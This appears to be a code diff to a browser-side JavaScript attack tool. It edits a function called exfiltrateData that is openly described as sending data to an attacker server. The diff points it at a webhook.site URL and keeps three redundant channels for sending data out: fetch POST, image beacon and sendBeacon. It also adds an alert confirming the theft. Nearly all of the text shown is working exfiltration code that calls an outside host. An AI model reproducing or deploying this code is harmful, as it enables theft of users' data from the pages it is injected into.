@@ -366,10 +366,14 @@
         function exfiltrateData(data) {
             console.log('[EXFIL] Attempting to send data to attacker server...');
             
+            // REPLACE THIS URL WITH YOUR WEBHOOK
+            // Get free webhook at: https://webhook.site
+            const WEBHOOK_URL = https://webhook.site/b9c05ffc-2382-425d-9df0-e6ee8628d67c;
+            
             // Try multiple exfiltration methods
             
-            // Method 1: Fetch API
-            fetch('http://10.0.0.74:8082/exfiltrate', {
+            // Method 1: Fetch API (Primary)
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -377,18 +381,19 @@
                 body: JSON.stringify(data)
             }).then(response => {
                 console.log('[EXFIL] ✓ Fetch successful:', response.status);
+                alert('✅ Data exfiltrated!\n\nCheck your webhook at:\n' + WEBHOOK_URL);
             }).catch(error => {
                 console.log('[EXFIL] ✗ Fetch failed:', error.message);
             });
             
-            // Method 2: Image beacon
+            // Method 2: Image beacon (Backup)
             const img = new Image();
-            img.src = 'http://10.0.0.74:8082/beacon?data=' + encodeURIComponent(JSON.stringify(data).substring(0, 2000));
+            img.src = WEBHOOK_URL + '?method=beacon&data=' + encodeURIComponent(JSON.stringify(data).substring(0, 2000));
             console.log('[EXFIL] ✓ Image beacon sent');
             
-            // Method 3: Navigator.sendBeacon (if available)
+            // Method 3: Navigator.sendBeacon (Backup)
             if (navigator.sendBeacon) {
-                navigator.sendBeacon('http://10.0.0.74:8082/beacon', JSON.stringify(data));
+                navigator.sendBeacon(WEBHOOK_URL + '?method=sendBeacon', JSON.stringify(data));
                 console.log('[EXFIL] ✓ SendBeacon sent');
             }
         }
